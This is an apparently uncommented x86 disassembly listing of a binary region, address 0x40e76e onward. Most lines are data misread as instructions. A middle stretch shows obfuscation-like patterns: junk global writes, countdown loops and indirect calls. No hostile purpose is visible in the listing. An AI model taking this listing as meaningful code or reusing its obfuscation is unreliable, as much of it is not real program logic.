  40e76e:	add    ah,ah
  40e770:	or     bh,0x32
  40e773:	fdivr  DWORD PTR [ecx+0x54150be5]
  40e779:	push   ebx
  40e77a:	mov    esp,0x23ccaf8d
  40e77f:	cmp    eax,0x5bf07462
  40e784:	xlat   BYTE PTR ds:[ebx]
  40e785:	(bad)  
  40e787:	movhlps xmm4,xmm7
  40e78a:	fs pop ebx
  40e78c:	cmp    dl,BYTE PTR [ecx+ebx*1+0x20]
  40e790:	imul   esp,DWORD PTR [edx],0xaed20424
  40e796:	inc    eax
  40e797:	mov    ebp,ds
  40e799:	jo     0x40e7a6
  40e79b:	sbb    al,0xb0
  40e79d:	jmp    0x40e792
  40e79f:	push   edx
  40e7a0:	and    esp,edi
  40e7a2:	test   al,0x83
  40e7a4:	push   ds
  40e7a5:	icebp  
  40e7a6:	jae    0x40e7b4
  40e7a8:	icebp  
  40e7a9:	das    
  40e7aa:	dec    eax
  40e7ab:	mov    esi,0x56402db6
  40e7b0:	ins    BYTE PTR es:[edi],dx
  40e7b1:	bound  esi,QWORD PTR [edi+0x666939d6]
  40e7b7:	cmp    al,BYTE PTR ds:0xaf49aa95
  40e7bd:	xchg   ecx,eax
  40e7be:	pop    ebx
  40e7bf:	sbb    edi,DWORD PTR [ebp+eiz*1+0x67]
  40e7c3:	daa    
  40e7c4:	cld    
  40e7c5:	sub    cl,dl
  40e7c7:	jnp    0x40e7e2
  40e7c9:	gs xchg ebp,eax
  40e7cb:	(bad)  
  40e7cd:	push   esp
  40e7ce:	xchg   esi,eax
  40e7cf:	das    
  40e7d0:	pop    ss
  40e7d1:	gs inc eax
  40e7d3:	xchg   esp,eax
  40e7d4:	stc    
  40e7d5:	cwde   
  40e7d6:	cmp    DWORD PTR [ebp+0x5],esp
  40e7d9:	mov    ds:0x9eb20583,eax
  40e7de:	sub    al,0xb7
  40e7e0:	and    cl,al
  40e7e2:	adc    BYTE PTR [edi+0x7c661912],bl
  40e7e8:	out    dx,eax
  40e7e9:	loope  0x40e78d
  40e7eb:	xor    DWORD PTR [ebx+0x7cbc82b8],edi
  40e7f1:	pushf  
  40e7f2:	dec    esp
  40e7f3:	mov    bh,0x7f
  40e7f5:	xchg   edx,eax
  40e7f6:	pop    ebp
  40e7f7:	dec    edi
  40e7f8:	out    0x8d,eax
  40e7fa:	cmp    eax,0xfe51fa97
  40e7ff:	(bad)  
  40e800:	retf   
  40e801:	pop    ecx
  40e802:	fdivr  QWORD PTR [edi+eiz*4-0x3ff16dad]
  40e809:	test   BYTE PTR [ecx+0x16fe57e4],cl
  40e80f:	popf   
  40e810:	add    DWORD PTR [edx],0xffffffa7
  40e813:	out    0x85,al
  40e815:	sub    al,0xb4
  40e817:	sbb    ecx,DWORD PTR [eax-0x21]
  40e81a:	sub    esp,ebp
  40e81c:	sar    DWORD PTR [edi],0x47
  40e81f:	xlat   BYTE PTR ds:[ebx]
  40e820:	xchg   BYTE PTR [ecx-0x73],bl
  40e823:	mov    al,0x58
  40e825:	sahf   
  40e826:	sub    al,0xc9
  40e828:	in     al,dx
  40e829:	test   dh,dh
  40e82b:	rcr    BYTE PTR [edi+0x25f036fa],0x1b
  40e832:	loope  0x40e877
  40e834:	lods   eax,DWORD PTR ds:[esi]
  40e835:	ins    BYTE PTR es:[edi],dx
  40e836:	dec    esp
  40e837:	call   0xe49b:0x4443928e
  40e83e:	dec    esp
  40e83f:	fidivr WORD PTR [ecx-0x4e]
  40e842:	xchg   esi,eax
  40e843:	cwde   
  40e844:	fdiv   DWORD PTR [ebp+0x1f]
  40e847:	xchg   edx,eax
  40e848:	outs   dx,BYTE PTR ds:[esi]
  40e849:	jecxz  0x40e8c9
  40e84b:	and    BYTE PTR [esi+0x30b72942],bl
  40e851:	clc    
  40e852:	popf   
  40e853:	or     BYTE PTR [edx+0x50e138a2],cl
  40e859:	popf   
  40e85a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e85b:	enter  0xbf67,0x82
  40e85f:	mov    ss,WORD PTR [ecx+0x190b7191]
  40e865:	or     BYTE PTR [ebx],dh
  40e867:	pop    edx
  40e868:	int    0x7b
  40e86a:	mov    ecx,0xbcaea3f7
  40e86f:	adc    bl,BYTE PTR [esi]
  40e871:	jl     0x40e821
  40e873:	pusha  
  40e874:	call   0x49210633
  40e879:	mov    ebp,0x800a457f
  40e87e:	adc    al,0x4e
  40e880:	loop   0x40e863
  40e882:	adc    BYTE PTR [eax-0x58],bl
  40e885:	mov    fs,WORD PTR ds:0x80942789
  40e88b:	add    cl,al
  40e88d:	jge    0x40e8f9
  40e88f:	jo     0x40e82a
  40e891:	lds    eax,FWORD PTR ds:0x1a310f38
  40e897:	pop    ss
  40e898:	out    0xbd,eax
  40e89a:	xor    DWORD PTR [esi],esp
  40e89c:	sub    al,0x5b
  40e89e:	push   edx
  40e89f:	into   
  40e8a0:	jnp    0x40e863
  40e8a2:	cmp    DWORD PTR [ebx+0x121eb01a],0x3858258d
  40e8ac:	hlt    
  40e8ad:	std    
  40e8ae:	or     ah,ch
  40e8b0:	les    eax,FWORD PTR cs:[ebx+0x407a3233]
  40e8b7:	fld    QWORD PTR [ecx+0x48]
  40e8ba:	jmp    0x934a:0x9a262470
  40e8c1:	(bad)  
  40e8c2:	fnstcw WORD PTR [ebp-0x4c]
  40e8c5:	cmc    
  40e8c6:	js     0x40e90c
  40e8c8:	retf   0xc3d6
  40e8cb:	push   ss
  40e8cc:	adc    eax,DWORD PTR [eax-0x75ad9883]
  40e8d2:	jle    0x40e8af
  40e8d4:	push   0x7f
  40e8d6:	inc    edi
  40e8d7:	adc    ah,ch
  40e8d9:	cmp    bh,BYTE PTR [esp+ecx*1-0x34377526]
  40e8e0:	pop    eax
  40e8e1:	mov    esi,0x3c80c65a
  40e8e6:	aad    0x55
  40e8e8:	mov    cl,0x97
  40e8ea:	xlat   BYTE PTR ds:[ebx]
  40e8eb:	push   ecx
  40e8ec:	jmp    0xcbca:0x885381ec
  40e8f3:	call   0x8443:0x1c3b462
  40e8fa:	mov    ebp,0xefaa198e
  40e8ff:	js     0x40e92b
  40e901:	push   ss
  40e902:	push   ecx
  40e903:	or     ebx,DWORD PTR [ebx]
  40e905:	dec    eax
  40e906:	or     DWORD PTR [bx+di-0x79],ecx
  40e90a:	sub    BYTE PTR [edx],ah
  40e90c:	mov    dh,0x8a
  40e90e:	js     0x40e892
  40e910:	addr16 pop ds
  40e912:	push   edx
  40e913:	les    ecx,FWORD PTR [esi-0x3e6cc98c]
  40e919:	arpl   di,ax
  40e91b:	int3   
  40e91c:	cmp    ecx,DWORD PTR [edx]
  40e91e:	std    
  40e91f:	(bad)  
  40e920:	mov    dh,0xb4
  40e922:	and    DWORD PTR [ebx+ecx*2+0x6e7f4b27],ebp
  40e929:	popa   
  40e92a:	out    0xaa,eax
  40e92c:	or     al,0x9
  40e92e:	jmp    0x2929a77a
  40e933:	push   es
  40e934:	mov    al,ds:0xd90aad10
  40e939:	lock add bh,ch
  40e93c:	test   eax,0xb2baa582
  40e941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e942:	xchg   edi,eax
  40e943:	js     0x40e996
  40e945:	mov    cl,BYTE PTR [esi]
  40e947:	mov    dl,0x24
  40e949:	sahf   
  40e94a:	xor    eax,0x7cdbf111
  40e94f:	mov    bl,0x37
  40e951:	xchg   sp,ax
  40e953:	push   edx
  40e954:	mov    ?,WORD PTR [ebx+0xd2cb6a5]
  40e95a:	cmp    eax,0x40fb64a0
  40e95f:	jp     0x40e942
  40e961:	adc    eax,0x7b799861
  40e966:	dec    ebp
  40e967:	stc    
  40e968:	adc    cl,0x1c
  40e96b:	cmp    al,0x2e
  40e96d:	xor    al,0xf8
  40e96f:	out    0x27,al
  40e971:	push   cs
  40e972:	adc    cl,BYTE PTR [edx+ebx*4+0x78]
  40e976:	mov    esi,0xd0c21cfb
  40e97b:	iret   
  40e97c:	add    DWORD PTR [ecx],edi
  40e97e:	mov    ch,0x5c
  40e980:	loop   0x40e945
  40e982:	pop    eax
  40e983:	push   eax
  40e984:	cmp    edx,ecx
  40e986:	add    BYTE PTR [ecx],al
  40e988:	push   cs
  40e989:	xchg   BYTE PTR [edi],bl
  40e98b:	test   cl,al
  40e98d:	into   
  40e98e:	dec    esp
  40e98f:	adc    esp,DWORD PTR [eax-0x6d3ebc38]
  40e995:	pusha  
  40e996:	pop    ebp
  40e997:	push   ebp
  40e998:	(bad)  
  40e999:	xchg   edi,eax
  40e99a:	lods   eax,DWORD PTR ds:[esi]
  40e99b:	aam    0xc6
  40e99d:	or     DWORD PTR [eax+0x1d3c3b64],edi
  40e9a3:	in     eax,0x7f
  40e9a5:	jne    0x40e9fe
  40e9a7:	push   esp
  40e9a8:	mov    ds:0x1873cfe4,al
  40e9ad:	mov    esi,0x336cbf5
  40e9b2:	pop    ds
  40e9b3:	mov    BYTE PTR [ecx-0x68],bh
  40e9b6:	sahf   
  40e9b7:	mov    eax,ds:0x34cc0dfe
  40e9bc:	xlat   BYTE PTR ds:[ebx]
  40e9bd:	mov    dh,0x90
  40e9bf:	xchg   edi,eax
  40e9c0:	sti    
  40e9c1:	test   BYTE PTR [ebx+0x62],0x29
  40e9c5:	add    DWORD PTR [ebp+0x1bac2e35],ebx
  40e9cb:	out    0x8c,eax
  40e9cd:	and    edx,DWORD PTR [eax]
  40e9cf:	jne    0x40e9a0
  40e9d1:	fnstcw WORD PTR [ecx]
  40e9d3:	add    edx,DWORD PTR [ebx+ebp*4-0x3a]
  40e9d7:	js     0x40e973
  40e9d9:	inc    ebp
  40e9da:	out    0x78,eax
  40e9dc:	jbe    0x40e971
  40e9de:	out    dx,eax
  40e9df:	cs xor edi,eax
  40e9e2:	inc    ebp
  40e9e3:	sub    esi,0x365777b
  40e9e9:	cmp    eax,0xb0228d46
  40e9ee:	outs   dx,BYTE PTR ds:[esi]
  40e9ef:	popf   
  40e9f0:	add    DWORD PTR [edi+0x7fb2a0e0],eax
  40e9f6:	dec    BYTE PTR [ebp-0x4a]
  40e9f9:	ins    BYTE PTR es:[edi],dx
  40e9fa:	pop    esi
  40e9fb:	ins    BYTE PTR es:[edi],dx
  40e9fc:	and    bh,BYTE PTR [eax+0x21f99f77]
  40ea02:	js     0x40e9a7
  40ea04:	mov    gs,esp
  40ea06:	mov    ds:0x2d7af74f,eax
  40ea0b:	sbb    eax,0xc3a180b0
  40ea10:	fnsave [ecx-0x3b]
  40ea13:	std    
  40ea14:	jnp    0x40e9ae
  40ea16:	adc    DWORD PTR [esi-0x9ecf7c],ebp
  40ea1c:	and    al,0x14
  40ea1e:	imul   edi,eax,0x1c68f144
  40ea24:	imul   esp,esi,0x3b163434
  40ea2a:	std    
  40ea2b:	repnz out 0xf1,eax
  40ea2e:	je     0x40ea46
  40ea30:	(bad)  
  40ea31:	ss xchg edi,esp
  40ea34:	mov    DWORD PTR [ebx+0x2d],0x2fd589f7
  40ea3b:	xchg   edx,eax
  40ea3c:	push   es
  40ea3d:	in     eax,0x3d
  40ea3f:	mov    DWORD PTR [ecx],edx
  40ea41:	cdq    
  40ea42:	retf   
  40ea43:	retf   0xbdb9
  40ea46:	push   0xf
  40ea48:	adc    al,0xe1
  40ea4a:	xor    al,0x91
  40ea4c:	rcr    ecx,1
  40ea4e:	add    BYTE PTR cs:[edx+ecx*1-0x66],bl
  40ea53:	(bad)  
  40ea54:	and    eax,DWORD PTR [eax+0x48e4e629]
  40ea5a:	sbb    al,0x29
  40ea5c:	or     edx,DWORD PTR [ebx+0x62]
  40ea5f:	retf   
  40ea60:	pop    es
  40ea61:	ins    DWORD PTR es:[edi],dx
  40ea62:	mov    bl,0x4a
  40ea64:	iret   
  40ea65:	xchg   DWORD PTR [ecx],ebp
  40ea67:	pop    ebp
  40ea68:	sbb    dl,bh
  40ea6a:	pop    ss
  40ea6b:	ret    0xf00c
  40ea6e:	test   BYTE PTR [ebp-0x6c],bh
  40ea71:	mov    eax,0xa693e989
  40ea76:	or     BYTE PTR [edi-0x4fd1706d],dl
  40ea7c:	xchg   ecx,eax
  40ea7d:	pop    ebx
  40ea7e:	pop    edi
  40ea7f:	push   ecx
  40ea80:	jle    0x40eadf
  40ea82:	out    0x33,eax
  40ea84:	jg     0x40ea43
  40ea86:	sbb    al,0x5a
  40ea88:	ror    bh,0x90
  40ea8b:	pop    edi
  40ea8c:	(bad)  
  40ea8e:	add    eax,edx
  40ea90:	and    BYTE PTR [edi],dl
  40ea92:	jmp    0xbb36:0x581d06d0
  40ea99:	fcomp  st(6)
  40ea9b:	iret   
  40ea9c:	xor    bl,ah
  40ea9e:	je     0x40eae8
  40eaa0:	push   esi
  40eaa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaa2:	cld    
  40eaa3:	mov    bl,0xf4
  40eaa5:	outs   dx,DWORD PTR ds:[esi]
  40eaa6:	repnz jmp 0x56c0:0x4c3f37e8
  40eaae:	jp     0x40eae1
  40eab0:	xor    al,0x3c
  40eab2:	(bad)  [edi+eiz*2-0x45]
  40eab6:	cmc    
  40eab7:	xchg   ecx,eax
  40eab8:	stos   DWORD PTR es:[edi],eax
  40eab9:	and    al,0xda
  40eabb:	dec    esp
  40eabc:	lods   eax,DWORD PTR ds:[esi]
  40eabd:	xor    ebx,0x71
  40eac0:	enter  0xaf4d,0xbe
  40eac4:	inc    edx
  40eac5:	call   0xc7aa:0x63d3661e
  40eacc:	(bad)  
  40eacd:	push   esi
  40eace:	das    
  40eacf:	mov    ebx,0xf9aab7bf
  40ead4:	cdq    
  40ead5:	dec    ecx
  40ead6:	popa   
  40ead7:	sar    DWORD PTR [ebp-0x7b],1
  40eada:	aad    0x12
  40eadc:	mov    esi,DWORD PTR gs:[ebx]
  40eadf:	sbb    al,0x52
  40eae1:	sub    DWORD PTR [ebx+0x4a02de63],esp
  40eae7:	jge    0x40eaec
  40eae9:	lahf   
  40eaea:	inc    esp
  40eaeb:	mov    edi,0x651883e4
  40eaf0:	xor    edx,DWORD PTR [edi]
  40eaf2:	push   ebx
  40eaf3:	dec    ebp
  40eaf4:	pop    es
  40eaf5:	(bad)  
  40eaf6:	add    esp,DWORD PTR [esi-0x62]
  40eaf9:	jecxz  0x40eae2
  40eafb:	xchg   ecx,eax
  40eafc:	mov    cl,0x8d
  40eafe:	xor    eax,0x24465454
  40eb03:	mov    edx,0x581f1130
  40eb08:	or     eax,DWORD PTR [eax+0x47eff61a]
  40eb0e:	aam    0xf9
  40eb10:	lods   al,BYTE PTR ds:[esi]
  40eb11:	add    ebp,DWORD PTR [eax-0x4184b7b9]
  40eb17:	into   
  40eb18:	cmp    DWORD PTR [ebp-0x3f],ebp
  40eb1b:	pop    ecx
  40eb1c:	cmp    al,0x11
  40eb1e:	pop    esp
  40eb1f:	rcr    BYTE PTR [eax+0x524e7086],1
  40eb25:	push   0x6c
  40eb27:	js     0x40eae5
  40eb29:	pop    ds
  40eb2a:	mov    ah,0x1f
  40eb2c:	stos   DWORD PTR es:[edi],eax
  40eb2d:	ret    0xe6af
  40eb30:	dec    ecx
  40eb31:	shl    DWORD PTR ds:0xbbfdb787,cl
  40eb37:	test   al,0xf4
  40eb39:	pop    ds
  40eb3a:	dec    esp
  40eb3b:	fidiv  DWORD PTR [edi]
  40eb3d:	push   eax
  40eb3e:	lods   eax,DWORD PTR ds:[esi]
  40eb3f:	mov    dh,0x6d
  40eb41:	xchg   esp,eax
  40eb42:	and    BYTE PTR [eax],ch
  40eb44:	loop   0x40ebb3
  40eb46:	inc    eax
  40eb47:	repnz mov al,ds:0x87456bd7
  40eb4d:	inc    ebp
  40eb4e:	mov    al,ds:0x51e8bc6
  40eb53:	aaa    
  40eb54:	or     BYTE PTR [ecx-0x3b],al
  40eb57:	adc    cl,dh
  40eb59:	lahf   
  40eb5a:	test   eax,0x9d24ef65
  40eb5f:	mov    ecx,0x35ee578f
  40eb64:	adc    ebx,edx
  40eb66:	mov    BYTE PTR [ebp+0x107e6b64],al
  40eb6c:	sub    edi,ebx
  40eb6e:	clc    
  40eb6f:	ins    DWORD PTR es:[edi],dx
  40eb70:	dec    di
  40eb72:	inc    ebp
  40eb73:	lea    ecx,[ebx+0x1bd9b978]
  40eb79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7a:	adc    al,0xe0
  40eb7c:	xchg   DWORD PTR [eax-0x45dcc5f6],eax
  40eb82:	jl     0x40ebc7
  40eb84:	xchg   esi,eax
  40eb85:	std    
  40eb86:	jne    0x40ebb1
  40eb88:	xor    eax,0xf2573504
  40eb8d:	xor    al,0x4d
  40eb8f:	xchg   esp,eax
  40eb90:	mov    bh,0x28
  40eb92:	hlt    
  40eb93:	adc    DWORD PTR [ebx+0x7e],esi
  40eb96:	inc    esi
  40eb97:	mov    al,0x6c
  40eb99:	mov    esp,0xe6cda2f7
  40eb9e:	or     dh,dl
  40eba0:	iret   
  40eba1:	imul   edi,DWORD PTR [esi-0x2651325f],0xf53bcf26
  40ebab:	push   eax
  40ebac:	inc    ebp
  40ebad:	cmp    eax,0x3d348b89
  40ebb2:	ins    DWORD PTR es:[edi],dx
  40ebb3:	mov    BYTE PTR [esi+0x23],cl
  40ebb6:	pop    ss
  40ebb7:	shr    BYTE PTR [edx+0x55],1
  40ebba:	pushf  
  40ebbb:	(bad)  
  40ebbc:	cmp    BYTE PTR [eax-0x11],bl
  40ebbf:	outs   dx,BYTE PTR ds:[esi]
  40ebc0:	sub    esp,edx
  40ebc2:	push   esp
  40ebc3:	inc    esp
  40ebc4:	mov    cl,0xee
  40ebc6:	cmp    eax,0xbaf9839b
  40ebcb:	shr    edx,cl
  40ebcd:	and    edi,edx
  40ebcf:	mov    esi,DWORD PTR [edi]
  40ebd1:	in     eax,dx
  40ebd2:	push   ebp
  40ebd3:	push   esp
  40ebd4:	lods   eax,DWORD PTR ds:[esi]
  40ebd5:	pushf  
  40ebd6:	aas    
  40ebd7:	add    eax,ecx
  40ebd9:	xchg   esp,eax
  40ebda:	imul   ecx,esi,0x3ac15173
  40ebe0:	imul   esp,DWORD PTR [eax-0x7bad4b13],0x33
  40ebe7:	ds in  al,dx
  40ebe9:	cmp    eax,0xa82efd27
  40ebee:	mov    cl,0xf1
  40ebf0:	push   esi
  40ebf1:	sbb    bl,dh
  40ebf3:	in     eax,dx
  40ebf4:	scas   eax,DWORD PTR es:[edi]
  40ebf5:	mov    esp,0xb487c906
  40ebfa:	pop    esi
  40ebfb:	loop   0x40ec77
  40ebfd:	mov    bl,0x43
  40ebff:	jae    0x40ec34
  40ec01:	sbb    DWORD PTR [eax],esp
  40ec03:	xor    edi,ebx
  40ec05:	mov    bh,0x6b
  40ec07:	push   esi
  40ec08:	sub    BYTE PTR [ecx],ah
  40ec0a:	fs dec esi
  40ec0c:	jecxz  0x40ebeb
  40ec0e:	out    dx,al
  40ec0f:	aad    0xa6
  40ec11:	retf   0xb4ab
  40ec14:	(bad)
  40ec18:	repnz inc ecx
  40ec1a:	cmp    edi,ebx
  40ec1c:	fmul   st,st(7)
  40ec1e:	inc    esi
  40ec1f:	dec    edx
  40ec20:	push   ds
  40ec21:	jecxz  0x40ebd6
  40ec23:	in     eax,0x7d
  40ec25:	(bad)  
  40ec26:	mov    DWORD PTR [esi+0x18],ebp
  40ec29:	retf   
  40ec2a:	sbb    al,0x15
  40ec2c:	ins    DWORD PTR es:[edi],dx
  40ec2d:	call   0x8dbce17b
  40ec32:	out    0xfd,al
  40ec34:	xor    ch,ah
  40ec36:	cmp    eax,0x682fa369
  40ec3b:	lods   al,BYTE PTR ds:[esi]
  40ec3c:	push   esp
  40ec3d:	xchg   esi,eax
  40ec3e:	adc    BYTE PTR [ebx+0x305b9bdc],dh
  40ec44:	ret    
  40ec45:	into   
  40ec46:	mov    edx,0xef00928a
  40ec4b:	in     al,dx
  40ec4c:	pop    ebx
  40ec4d:	aam    0x5
  40ec4f:	pop    ebx
  40ec50:	xor    dh,BYTE PTR [esi-0x53]
  40ec53:	xchg   edi,eax
  40ec54:	jbe    0x40ebf1
  40ec56:	push   es
  40ec57:	or     DWORD PTR [ebp-0x14895059],ecx
  40ec5d:	cli    
  40ec5e:	cmp    edi,DWORD PTR [ebx-0xb]
  40ec61:	jnp    0x40ecb1
  40ec63:	push   es
  40ec64:	out    0x28,al
  40ec66:	xchg   esp,eax
  40ec67:	xor    ecx,DWORD PTR [ebp-0x2c]
  40ec6a:	aaa    
  40ec6b:	pop    ecx
  40ec6c:	hlt    
  40ec6d:	push   ebp
  40ec6e:	lods   al,BYTE PTR ds:[esi]
  40ec6f:	hlt    
  40ec70:	rcr    BYTE PTR [ebx-0x4f],0xd7
  40ec74:	loope  0x40ecc9
  40ec76:	mov    cl,0x8c
  40ec78:	sbb    DWORD PTR [ebp+0xe],ecx
  40ec7b:	addr16 mov ebx,0xccd78cab
  40ec81:	out    dx,al
  40ec82:	add    BYTE PTR [ecx],0xa0
  40ec85:	cwde   
  40ec86:	ja     0x40ec4a
  40ec88:	sbb    DWORD PTR [edx],0x8754e35f
  40ec8e:	jge    0x40ec59
  40ec90:	cmp    bh,BYTE PTR [edx]
  40ec92:	mov    edi,0x88b79ed7
  40ec97:	jbe    0x40eca9
  40ec99:	dec    DWORD PTR [ebx-0x15]
  40ec9c:	xchg   BYTE PTR [edi+0x59d6384e],dl
  40eca2:	shl    DWORD PTR [ebx],1
  40eca4:	daa    
  40eca5:	sbb    al,0x6b
  40eca8:	jns    0x40ed06
  40ecaa:	pop    ecx
  40ecab:	arpl   WORD PTR [ecx],cx
  40ecad:	mov    esi,0xbcee08be
  40ecb2:	pusha  
  40ecb3:	and    eax,0xcec75006
  40ecb9:	(bad)  [eax+0x7]
  40ecbc:	dec    eax
  40ecbd:	pop    ecx
  40ecbe:	xchg   esi,eax
  40ecbf:	gs inc esi
  40ecc1:	mov    ah,0xf0
  40ecc3:	mov    ds:0x171f0dbc,al
  40ecc8:	cmp    esp,ebx
  40ecca:	mov    ebp,0x3259451
  40eccf:	mov    ebp,0x92bc6fde
  40ecd4:	not    BYTE PTR [eax-0x3805fc34]
  40ecda:	add    eax,0x42d018
  40ecdf:	ins    BYTE PTR es:[edi],dx
  40ece0:	xor    eax,0x38390000
  40ece5:	mov    DWORD PTR ds:0x42c000,0x4c8
  40ecef:	je     0x40ed10
  40ecf5:	mov    DWORD PTR ds:0x429010,0x639a
  40ecff:	mov    eax,DWORD PTR [eax]
  40ed01:	mov    DWORD PTR ds:0x429004,0x7615
  40ed0b:	jmp    0x4113c1
  40ed10:	mov    eax,ds:0x42d008
  40ed15:	mov    eax,DWORD PTR [ebp+0x18]
  40ed18:	cmp    eax,esi
  40ed1a:	mov    DWORD PTR ds:0x429000,0x39ad
  40ed24:	jne    0x40ed48
  40ed2a:	mov    DWORD PTR ds:0x429004,0x5d12
  40ed34:	push   0xf89c85b8
  40ed39:	mov    DWORD PTR ds:0x42a008,0x6b01
  40ed43:	jmp    0x4113b0
  40ed48:	mov    esi,DWORD PTR [ebp+0x18]
  40ed4b:	mov    eax,0x4a6b
  40ed50:	mov    eax,0xf89c85bb
  40ed55:	cmp    esi,eax
  40ed57:	mov    DWORD PTR ds:0x42900c,0x4643
  40ed61:	jne    0x4113a0
  40ed67:	mov    eax,DWORD PTR [ebp+0x10]
  40ed6a:	xor    eax,ecx
  40ed6c:	mov    DWORD PTR ds:0x42a004,0x11
  40ed76:	cmp    DWORD PTR ds:0x42a004,0x0
  40ed7d:	je     0x40edd0
  40ed83:	cmp    DWORD PTR ds:0x42a004,0x20
  40ed8a:	jne    0x40edb2
  40ed90:	push   0x42e134
  40ed95:	push   0x7ef6
  40ed9a:	push   0x57ca
  40ed9f:	push   0x2ef4
  40eda4:	push   DWORD PTR [ebp-0x1c]
  40eda7:	push   0x33b6
  40edac:	call   DWORD PTR ds:0x42ed67
  40edb2:	xor    esi,esi
  40edb4:	xor    esi,DWORD PTR ds:0x42a004
  40edba:	dec    esi
  40edbb:	mov    DWORD PTR ds:0x42a004,esi
  40edc1:	jmp    0x40ed76
  40edc6:	adc    DWORD PTR ds:0x42c01c,0x56a2
  40edd0:	add    eax,edx
  40edd2:	movzx  esi,WORD PTR ds:0x42d010
  40edd9:	xor    esi,DWORD PTR ds:0x429018
  40eddf:	mov    DWORD PTR ds:0x42d010,esi
  40ede5:	mov    DWORD PTR [ebp-0x18],eax
  40ede8:	mov    eax,ds:0x42c014
  40eded:	xor    DWORD PTR ds:0x42901c,eax
  40edf3:	mov    eax,DWORD PTR [ebp+0xc]
  40edf6:	or     DWORD PTR ds:0x42a014,ecx
  40edfc:	mov    esi,DWORD PTR [ebp-0x8]
  40edff:	or     DWORD PTR ds:0x42c00c,0x42c010
  40ee09:	xor    eax,ecx
  40ee0b:	mov    DWORD PTR ds:0x42b014,0x6609
  40ee15:	add    eax,edx
  40ee17:	mov    DWORD PTR ds:0x42901c,0x1324
  40ee21:	imul   eax,DWORD PTR [esi]
  40ee24:	dec    esi
  40ee25:	mov    esi,DWORD PTR [ebp+0x8]
  40ee28:	and    DWORD PTR ds:0x42a01c,0x42d000
  40ee32:	xor    esi,ecx
  40ee34:	adc    DWORD PTR ds:0x42d01c,0x429024
  40ee3e:	add    esi,edx
  40ee40:	cmp    esi,eax
  40ee42:	mov    eax,0x6259
  40ee47:	mov    eax,DWORD PTR [ebp-0x4]
  40ee4a:	push   ebx
  40ee4b:	mov    DWORD PTR ds:0x42d014,0x783b
  40ee55:	je     0x40eecd
  40ee5b:	add    DWORD PTR ds:0x42d008,0x6ad8
  40ee65:	mov    esi,DWORD PTR [ebp-0x18]
  40ee68:	add    DWORD PTR [eax],esi
  40ee6a:	mov    DWORD PTR ds:0x429024,0x10
  40ee74:	cmp    DWORD PTR ds:0x429024,0x0
  40ee7b:	je     0x40eead
  40ee81:	cmp    DWORD PTR ds:0x429024,0x1d
  40ee88:	jne    0x40ee94
  40ee8e:	call   DWORD PTR ds:0x42ed6b
  40ee94:	xor    eax,eax
  40ee96:	add    eax,DWORD PTR ds:0x429024
  40ee9c:	dec    eax
  40ee9d:	mov    ds:0x429024,eax
  40eea2:	jmp    0x40ee74
  40eea7:	sub    eax,DWORD PTR ds:0x42a010
  40eead:	mov    eax,DWORD PTR [ebp-0x4]
  40eeb0:	neg    esi
  40eeb2:	mov    esi,DWORD PTR [ebp+0xc]
  40eeb5:	sub    DWORD PTR ds:0x42b000,0x42c004
  40eebf:	xor    esi,ecx
  40eec1:	add    esi,edx
  40eec3:	imul   esi,DWORD PTR [eax]
  40eec6:	mov    DWORD PTR [eax],esi
  40eec8:	jmp    0x40eed2
  40eecd:	mov    esi,DWORD PTR [ebp+0x14]
  40eed0:	xor    DWORD PTR [eax],esi
  40eed2:	mov    eax,DWORD PTR [ebp-0x4]
  40eed5:	mov    edi,DWORD PTR [ebp+0x10]
  40eed8:	xor    edi,ecx
  40eeda:	mov    esi,0xffcd8d20
  40eedf:	mov    ebx,esi
  40eee1:	sub    ebx,edi
  40eee3:	add    DWORD PTR [eax],ebx
  40eee5:	mov    eax,DWORD PTR [ebp-0x4]
  40eee8:	mov    edi,DWORD PTR [ebp-0x8]
  40eeeb:	add    edi,DWORD PTR [eax]
  40eeed:	mov    DWORD PTR [ebp-0x8],edi
  40eef0:	mov    eax,DWORD PTR [ebp+0xc]
  40eef3:	mov    edi,DWORD PTR [ebp+0xc]
  40eef6:	xor    edi,ecx
  40eef8:	xor    eax,ecx
  40eefa:	lea    eax,[eax+edi*1+0x64e5c0]
  40ef01:	mov    edi,DWORD PTR [ebp+0xc]
  40ef04:	xor    edi,ecx
  40ef06:	add    edi,edx
  40ef08:	imul   eax,edi
  40ef0b:	mov    edi,DWORD PTR [ebp+0xc]
  40ef0e:	xor    edi,ecx
  40ef10:	sub    edi,eax
  40ef12:	jmp    0x411286
  40ef17:	ror    DWORD PTR [ebx+ecx*8-0x5e],0xbb
  40ef1c:	xchg   ecx,eax
  40ef1d:	mov    esi,ebx
  40ef1f:	pop    ebp
  40ef20:	jmp    0x40ef7d
  40ef22:	dec    eax
  40ef23:	xor    dl,BYTE PTR [ebx+0x65]
  40ef26:	pop    ss
  40ef27:	pusha  
  40ef28:	leave  
  40ef29:	jp     0x40efa5
  40ef2b:	adc    ebx,DWORD PTR [edi+0x7a]
  40ef2e:	jp     0x40eeb0
  40ef30:	dec    ebx
  40ef31:	dec    edi
  40ef32:	lahf   
  40ef33:	(bad)  
  40ef34:	jne    0x40eec7
  40ef36:	xor    dl,BYTE PTR [edx-0x43]
  40ef39:	mov    dl,0xb7
  40ef3b:	scas   eax,DWORD PTR es:[edi]
  40ef3c:	pop    esi
  40ef3d:	pop    edx
  40ef3e:	sar    DWORD PTR [eax-0x52],0xb7
  40ef42:	imul   BYTE PTR [edi+eax*2+0xd]
  40ef46:	dec    edi
  40ef47:	das    
  40ef48:	stc    
  40ef49:	imul   ebx,DWORD PTR [edx+0x12278b75],0x6266850e
  40ef53:	jge    0x40ef52
  40ef55:	fild   DWORD PTR [edi]
  40ef57:	mov    esi,0xc363b28e
  40ef5c:	add    DWORD PTR [edi],ebp
  40ef5e:	sub    bl,BYTE PTR [ebp-0x27]
  40ef61:	mov    esi,?
  40ef63:	loop   0x40eef3
  40ef65:	fisttp DWORD PTR [ebx+0x43]
  40ef68:	in     eax,dx
  40ef69:	lods   eax,DWORD PTR ds:[esi]
  40ef6a:	pop    eax
  40ef6b:	dec    esi
  40ef6c:	sub    al,0xa3
  40ef6e:	in     eax,0xbd
  40ef70:	or     eax,0xb140ef8f
  40ef75:	(bad)  
  40ef76:	scas   eax,DWORD PTR es:[edi]
  40ef77:	mov    ecx,0x143e2510
  40ef7c:	ds pusha 
  40ef7e:	inc    ecx
  40ef7f:	push   eax
